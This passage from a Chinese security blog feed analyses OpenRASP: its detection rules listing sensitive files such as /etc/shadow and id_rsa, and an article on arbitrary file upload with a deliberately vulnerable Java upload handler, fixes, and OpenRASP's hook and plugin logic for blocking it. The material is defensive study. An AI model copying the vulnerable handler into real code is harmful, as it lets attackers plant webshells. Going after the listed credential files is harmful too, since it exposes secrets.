class="line">&#125;)</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> forcefulBrowsing = &#123;</span><br><span class="line">    <span class="attr">dotFiles</span>: <span class="regexp">/\.(7z|tar|gz|bz2|xz|rar|zip|sql|db|sqlite)$/</span>,</span><br><span class="line">    <span class="attr">nonUserDirectory</span>: <span class="regexp">/^\/(proc|sys|root)/</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// webdav 文件探针 - 最常被下载的文件</span></span><br><span class="line">    <span class="attr">unwantedFilenames</span>: [</span><br><span class="line">        <span class="comment">// user files</span></span><br><span class="line">        <span class="string">&#x27;.DS_Store&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;id_rsa&#x27;</span>, <span class="string">&#x27;id_rsa.pub&#x27;</span>, <span class="string">&#x27;known_hosts&#x27;</span>, <span class="string">&#x27;authorized_keys&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.bash_history&#x27;</span>, <span class="string">&#x27;.csh_history&#x27;</span>, <span class="string">&#x27;.zsh_history&#x27;</span>, <span class="string">&#x27;.mysql_history&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// project files</span></span><br><span class="line">        <span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;.user.ini&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;web.config&#x27;</span>, <span class="string">&#x27;web.xml&#x27;</span>, <span class="string">&#x27;build.property.xml&#x27;</span>, <span class="string">&#x27;bower.json&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Gemfile&#x27;</span>, <span class="string">&#x27;Gemfile.lock&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.gitignore&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;error_log&#x27;</span>, <span class="string">&#x27;error.log&#x27;</span>, <span class="string">&#x27;nohup.out&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 目录探针 - webshell 查看频次最高的目录</span></span><br><span class="line">    <span class="attr">unwantedDirectory</span>: [</span><br><span class="line">        <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/var/log&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/private/var/log&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/proc&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/sys&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;C:\\&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;D:\\&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;E:\\&#x27;</span></span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件探针 - webshell 查看频次最高的文件</span></span><br><span class="line">    <span class="attr">absolutePaths</span>: [</span><br><span class="line">    <span class="string">&#x27;/etc/issue&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/etc/shadow&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/etc/passwd&#x27;</span>,</span><br><span class="line">        <span class="comment">// &#x27;/etc/hosts&#x27;,</span></span><br><span class="line">        <span class="string">&#x27;/etc/apache2/apache2.conf&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/root/.bash_history&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/root/.bash_profile&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;c:\\windows\\system32\\inetsrv\\metabase.xml&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;c:\\windows\\system32\\drivers\\etc\\hosts&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>《Java代码审计-入门篇》</span><br><span class="line"><span class="number">2.</span>官方文档 Hook函数列表</span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/hacking/architect/hook.html</span></span><br><span class="line"><span class="number">3.</span>官方文档 功能说明</span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/usage/main.html</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP-文件上传漏洞</title>
      <link href="/2022/12/07/OpenRASP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/12/07/OpenRASP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP-文件上传漏洞"><a href="#OpenRASP-文件上传漏洞" class="headerlink" title="OpenRASP-文件上传漏洞"></a>OpenRASP-文件上传漏洞</h1><h2 id="漏洞简介及业务代码"><a href="#漏洞简介及业务代码" class="headerlink" title="漏洞简介及业务代码"></a>漏洞简介及业务代码</h2><p>​任意文件上传漏洞的本质是在进行文件上传操作时，未对文件类型进行检测或检测功能不规范导致被绕过，从而使攻击者上传的可执行脚本（WebShell）被上传至服务器并成功解析。常见的漏洞场景有：</p><ul><li>仅前端过滤导致的任意文件上传漏洞。</li><li>后端过滤不严格导致的任意文件上传，比如indexOf取尾缀不规范，Content-Type被前端修改绕过后端匹配（如上传JSP，将原本的text&#x2F;html改为image&#x2F;jpg，后端根据Content-type进行检测）。</li></ul><h2 id="commons-fileupload-方式文件上传"><a href="#commons-fileupload-方式文件上传" class="headerlink" title="commons.fileupload 方式文件上传"></a>commons.fileupload 方式文件上传</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前端 这里是jsp表达式，如果用thymeleaf，则th:action=&quot;@&#123;/uploadoutput&#125;</span></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;&lt;%=request.getRequestURL() %&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//后端</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isMultipart</span> <span class="operator">=</span> ServletFileUpload.isMultipartContent(request);</span><br><span class="line">    <span class="keyword">if</span> (isMultipart) &#123;</span><br><span class="line">        <span class="type">DiskFileItemFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DiskFileItemFactory</span>();</span><br><span class="line">        <span class="type">ServletFileUpload</span> <span class="variable">upload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>(factory);</span><br><span class="line">        List&lt;FileItem&gt; items = upload.parseRequest(request);</span><br><span class="line">        <span class="keyword">for</span> (FileItem item: items) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(item.get());  <span class="comment">//取出文件内容</span></span><br><span class="line">            String path;</span><br><span class="line">            <span class="type">String</span> <span class="variable">serverInfo</span> <span class="operator">=</span> application.getServerInfo();   <span class="comment">//当前服务器信息</span></span><br><span class="line">            <span class="keyword">if</span> (serverInfo != <span class="literal">null</span> &amp;&amp; serverInfo.toLowerCase().contains(<span class="string">&quot;weblogic&quot;</span>)) &#123;</span><br><span class="line">path = application.getResource(<span class="string">&quot;/&quot;</span>).getPath() + <span class="string">&quot;/&quot;</span> + item.getName();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">path = application.getRealPath(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/&quot;</span> + item.getName();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(os);</span><br><span class="line">writer.print(content.getBytes(<span class="string">&quot;UTF-8&quot;</span>));  <span class="comment">//将文件内容写入新路径</span></span><br><span class="line">writer.close();</span><br><span class="line">out.println(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;写入文件 ====&gt; &quot;</span> + path);</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace(response.getWriter());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​对于文件上传的防范或修复有以下几种方式：</p><ul><li>对上传的文件进行重命名、自定义后缀等。</li><li>对于上传文件的后缀名截取校验时，忽略大小写，采用统一小写或统一大写的方式进行比对检验。</li><li>严格检测上传文件的类型，推荐采用白名单的形式来检验后缀。</li><li>限制上传文件的大小和上传频率。</li></ul><h2 id="OpenRASP检测流程"><a href="#OpenRASP检测流程" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h2><h3 id="FileUploadItemHook"><a href="#FileUploadItemHook" class="headerlink" title="FileUploadItemHook"></a>FileUploadItemHook</h3><ul><li><p>应用类：org&#x2F;apache&#x2F;commons&#x2F;fileupload&#x2F;disk&#x2F;DiskFileItem类</p></li><li><p>hook类：FileUploadItemHook</p></li></ul><p>​DiskFileItem是FileItem接口的实现类，DiskFileItem#get()用于获取上传文件内容的字节数组，DiskFileItem#write(File file) 将上传文件内容写入到指定文件，DiskFileItem#getInputStream()用于获取上传文件内容的输入流。<br>​在hook类FileUploadItemHook中，hookMethod方法完成以下操作：</p><p>1.将checkFileItemWithBytes检测代码插入到DiskFileItem#get()之后</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileUploadItemHook.class,<span class="string">&quot;checkFileItemWithBytes&quot;</span>, <span class="string">&quot;$0,$_&quot;</span>, Object.class, <span class="type">byte</span>[].class);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;()[B&quot;</span>, src);</span><br></pre></td></tr></table></figure><p>2.将checkFileItemWithStream检测代码插入到DiskFileItem#write(File file) 之前、之后</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">afterSrc</span> <span class="operator">=</span> getInvokeStaticSrc(FileUploadItemHook.class, <span class="string">&quot;enableFileUploadHook&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">src = getInvokeStaticSrc(FileUploadItemHook.class,<span class="string">&quot;checkFileItemWithStream&quot;</span>, <span class="string">&quot;$0&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;(Ljava/io/File;)V&quot;</span>, src);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;(Ljava/io/File;)V&quot;</span>, afterSrc, <span class="literal">true</span>);               </span><br></pre></td></tr></table></figure><p>3.将checkFileItemWithStream检测代码插入到DiskFileItem#getInputStream()之前、之后</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">src = getInvokeStaticSrc(FileUploadItemHook.class,<span class="string">&quot;checkFileItemWithStream&quot;</span>, <span class="string">&quot;$0&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()Ljava/io/InputStream;&quot;</span>, src);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()Ljava/io/InputStream;&quot;</span>, afterSrc, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>​首先看插入的检测代码checkFileItemWithBytes和checkFileItemWithStream做了什么？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在checkFileItemWithBytes方法中，如果enableFileUploadHook标志位为true，该方法会将字段名、文件名和文件内容放入hashMap，并传递给HookHandler.doCheck方法</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;name&quot;</span>, name != <span class="literal">null</span> ? name : <span class="string">&quot;&quot;</span>);</span><br><span class="line">params.put(<span class="string">&quot;filename&quot;</span>, filename);</span><br><span class="line">params.put(<span class="string">&quot;content&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(content, getCharSet(item)));</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.FILEUPLOAD, params);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在checkFileItemWithBytes方法中，会直接调用DiskFileItem#get()方法，因为该方法已经被插入checkFileItemWithBytes检测代码，并将enableFileUploadHook标志位设为false</span></span><br><span class="line">Reflection.invokeMethod(item, <span class="string">&quot;get&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">enableFileUploadHook.set(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//enableFileUploadHook方法，将标志位恢复为true</span></span><br><span class="line">enableFileUploadHook.set(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>​现在就很容易理解，为什么要在write和getInputStream方法添加这么多检测代码，是因为这两方法插入的都是反射执行DiskFileItem#get，get方法中调用检测代码checkFileItemWithBytes，检测完毕后将enableFileUploadHook标志位设置为false，从而在write和getInputStream方法运行自身逻辑期间，当前线程是不需要再次进入检测，自身逻辑执行完毕后，通过插入的enableFileUploadHook方法将该标志位重新设置为true。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HookHandler.doCheck(CheckParameter.Type.FILEUPLOAD, params);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">FILEUPLOAD(<span class="string">&quot;fileUpload&quot;</span>, <span class="keyword">new</span> <span class="title class_">V8AttackChecker</span>(), <span class="number">1</span> &lt;&lt; <span class="number">7</span>);</span><br></pre></td></tr></table></figure><p>​继续观察checkFileItemWithBytes检测代码，将字段名、文件名和文件内容放入params后，调用HookHandler.doCheck，从初始化时寄存的映射关系CheckerManager.checkers中找到”fileUpload”对应的V8AttackChecker，执行流最终到JS.Check方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JS.Check实现逻辑拆解如下：  (位于plugin.js.JS)</span></span><br><span class="line">JsonStream.serialize(checkParameter.getParams(), out);<span class="comment">//将获取的参数(字段名、文件名、文件内容)序列化</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (type == Type.DIRECTORY || type == Type.READFILE || type == Type.WRITEFILE || type == Type.SQL</span><br><span class="line">                || type == Type.SSRF) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//如果LRU缓存中存在该方法参数，则直接返回null，即没问题不阻止</span></span><br><span class="line">    <span class="keyword">if</span> (Config.commonLRUCache.isContainsKey(hashData)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//调用Native方法V8.Check，进入C++执行逻辑，使用js文件中的检测规则进行检测</span></span><br><span class="line">results = V8.Check(type.getName(), out.getByteArray(), out.size(), <span class="keyword">new</span> <span class="title class_">Context</span>(checkParameter.getRequest()),</span><br><span class="line">                    (<span class="type">int</span>) Config.getConfig().getPluginTimeout());</span><br><span class="line">...</span><br><span class="line"><span class="comment">//如果results为null，说明没问题，就把当前方法参数的hash值放入LRU缓存，并直接返回null</span></span><br><span class="line">Config.commonLRUCache.put(hashData, <span class="literal">null</span>);   <span class="comment">//放入缓存，下次默认该参数无害不用再检测</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">//走到这还没return，说明检测到问题，将results以json格式解析，并将检测插件名称、描述信息、行为、检测算法、请求地址、isBlock等信息放入attackInfos并返回</span></span><br><span class="line"><span class="type">JsonArray</span> <span class="variable">j</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonParser</span>().parse(<span class="keyword">new</span> <span class="title class_">String</span>(results, <span class="string">&quot;UTF-8&quot;</span>)).getAsJsonArray();</span><br><span class="line">attackInfos.add(<span class="keyword">new</span> <span class="title class_">AttackInfo</span>(checkParameter, action, message, name, confidence, algorithm, params, obj));</span><br><span class="line"><span class="keyword">return</span> attackInfos;</span><br></pre></td></tr></table></figure><p>​最终，JS.Check返回的attackInfos会被记录在rasp&#x2F;logs&#x2F;alarm&#x2F;alarm.log，isBlock被解析出来为true，执行流进入HookHandler#handleBlock方法，通过HttpServletResponse#sendError方法返回小恐龙页面。并抛出SecurityException异常。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//最终，attackInfos被记录在rasp/logs/alarm/alarm.log （位于AttackCheckListener#onCheckUpdate方法）</span></span><br><span class="line"><span class="type">Logger</span> <span class="variable">ATTACK_ALARM_LOGGER</span> <span class="operator">=</span> Logger.getLogger(AbstractChecker.class.getPackage().getName() + <span class="string">&quot;.alarm&quot;</span>);</span><br><span class="line">Checker.ATTACK_ALARM_LOGGER.info(info);  <span class="comment">//(位于plugin.checker.AttackCheckListener)</span></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//isBlock会被解析出来，通过HttpServletResponse#sendError方法返回小恐龙页面 （位于HookHandler#handleBlock方法）</span></span><br><span class="line"><span class="type">SecurityException</span> <span class="variable">securityException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Request blocked by OpenRASP&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (responseCache.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">    responseCache.get().sendError(parameter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> securityException;</span><br></pre></td></tr></table></figure><p>​至此，commons.fileupload 方式的文件上传分析完毕，因为是这一系列的第一个，做得尽可能详细些，后面其他类型web漏洞的检测逻辑，主要关注hook的应用类及其方法，传递给checker的params，以及V8AttackChecker等检测器check方法实现。可以看到这部分没有进入Native方法V8.Check进行分析，主要是自己对JNI也是涉猎不深，这部分实现对params参数的真正检测，必然是需要学习的重点，将在对web漏洞全面回顾后进行深究。这里留下疑问：</p><blockquote><p>native方法V8.Check是怎样实现的，如何处理文件上传问题？如果在自己的项目里实现一般native方法？</p></blockquote><h3 id="FileUploadHook"><a href="#FileUploadHook" class="headerlink" title="FileUploadHook"></a>FileUploadHook</h3><p>应用类：org&#x2F;apache&#x2F;commons&#x2F;fileupload&#x2F;FileUploadBase</p><p>hook类：FileUploadHook</p><p>​同样是监控commons.fileupload 方式的文件上传，检测代码cacheFileUploadParam实现了，将上传文件的字段名和文件名放入HookHandler.requestCache的属性formItemCache和fileParamCache寄存器起来，没有其他操作。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(FileUploadHook.class, <span class="string">&quot;cacheFileUploadParam&quot;</span>, <span class="string">&quot;$_&quot;</span>, Object.class);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;parseRequest&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">（位于FileUploadHook#cacheFileUploadParam方法）</span><br><span class="line">HookHandler.requestCache.get().setFormItemCache(formItemCache);</span><br><span class="line">HookHandler.requestCache.get().setFileParamCache(fileItemCache);</span><br></pre></td></tr></table></figure><h3 id="JerseyMultipart"><a href="#JerseyMultipart" class="headerlink" title="JerseyMultipart"></a>JerseyMultipart</h3><p>应用类：org&#x2F;glassfish&#x2F;jersey&#x2F;media&#x2F;multipart&#x2F;FormDataMultiPart</p><p>hook类：JerseyMultipart</p><p>​监控Jersey框架实现文件上传，将检测代码checkFileUpload插入到FormDataMultiPart#getFields方法后，检测逻辑是将文件名和文件内容放入params，传递给HookHandler.doCheck方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(JerseyMultipart.class, <span class="string">&quot;checkFileUpload&quot;</span>, <span class="string">&quot;$_&quot;</span>, Object.class);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;getFields&quot;</span>, <span class="string">&quot;()Ljava/util/Map;&quot;</span>, src);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">（位于JerseyMultipart#checkFileUpload方法）</span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;filename&quot;</span>, name);</span><br><span class="line">params.put(<span class="string">&quot;content&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(content));</span><br><span class="line">params.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.FILEUPLOAD, params);</span><br></pre></td></tr></table></figure><h2 id="文件上传漏洞检测算法"><a href="#文件上传漏洞检测算法" class="headerlink" title="文件上传漏洞检测算法"></a>文件上传漏洞检测算法</h2><p>检测规则位于&#x2F;plugins&#x2F;official&#x2F;plugin.js中，这里汇总js对文件上传的检测规则</p><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件上传 - COPY/MOVE 方式，仅适合 tomcat</span></span><br><span class="line"><span class="attr">fileUpload_webdav</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法1 - MOVE 方式上传脚本文件&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 文件上传 - Multipart 方式上传脚本文件</span></span><br><span class="line"><span class="attr">fileUpload_multipart_script</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法2 - Multipart 方式上传 PHP/JSP 等脚本文件&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 文件上传 - Multipart 方式上传 HTML/JS 等文件</span></span><br><span class="line"><span class="attr">fileUpload_multipart_html</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法3 - Multipart 方式上传 HTML/JS 等文件&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;ignore&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 文件上传 - Multipart 方式上传 DLL/EXE 等文件</span></span><br><span class="line"><span class="attr">fileUpload_multipart_exe</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法3 - Multipart 方式上传 DLL/EXE 等文件&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;ignore&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;fileUpload&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否禁止使用 multipart 上传脚本文件，或者 apache/php 服务器配置文件</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">fileUpload_multipart_script</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (scriptFileRegex.<span class="title function_">test</span>(params.<span class="property">filename</span>) || ntfsRegex.<span class="title function_">test</span>(params.<span class="property">filename</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">fileUpload_multipart_script</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File upload - Uploading a server-side script file with multipart/form-data protocol, filename: %1%&quot;</span>, [params.<span class="property">filename</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">95</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;fileUpload_multipart_script&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (params.<span class="property">filename</span> == <span class="string">&quot;.htaccess&quot;</span> || params.<span class="property">filename</span> == <span class="string">&quot;.user.ini&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">fileUpload_multipart_script</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File upload - Uploading a server-side config file with multipart/form-data protocol, filename: %1%&quot;</span>, [params.<span class="property">filename</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">95</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;fileUpload_multipart_script&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否禁止 HTML/JS 文件，主要是对抗钓鱼、CORS绕过等问题</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">fileUpload_multipart_html</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (htmlFileRegex.<span class="title function_">test</span>(params.<span class="property">filename</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">fileUpload_multipart_html</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File upload - Uploading a HTML/JS file with multipart/form-data protocol, filename: %1%&quot;</span>, [params.<span class="property">filename</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;fileUpload_multipart_html&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否禁止 EXE/DLL 文件，防止被用于后门下载站点</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">fileUpload_multipart_exe</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (exeFileRegex.<span class="title function_">test</span>(params.<span class="property">filename</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">fileUpload_multipart_exe</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;File upload - Uploading a Executable file with multipart/form-data protocol, filename: %1%&quot;</span>, [params.<span class="property">filename</span>]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;fileUpload_multipart_exe&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (algorithmConfig.<span class="property">fileUpload_webdav</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    plugin.<span class="title function_">register</span>(<span class="string">&#x27;webdav&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 源文件不是脚本 &amp;&amp; 目标文件是脚本，判定为MOVE方式写后门</span></span><br><span class="line">        <span class="keyword">if</span> (! scriptFileRegex.<span class="title function_">test</span>(params.<span class="property">source</span>) &amp;&amp; scriptFileRegex.<span class="title function_">test</span>(params.<span class="property">dest</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:    algorithmConfig.<span class="property">fileUpload_webdav</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:   <span class="title function_">_</span>(<span class="string">&quot;File upload - Uploading a server-side script file with HTTP method %1%, file is %2%&quot;</span>, [</span><br><span class="line">                    context.<span class="property">method</span>, params.<span class="property">dest</span></span><br><span class="line">                ]),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span 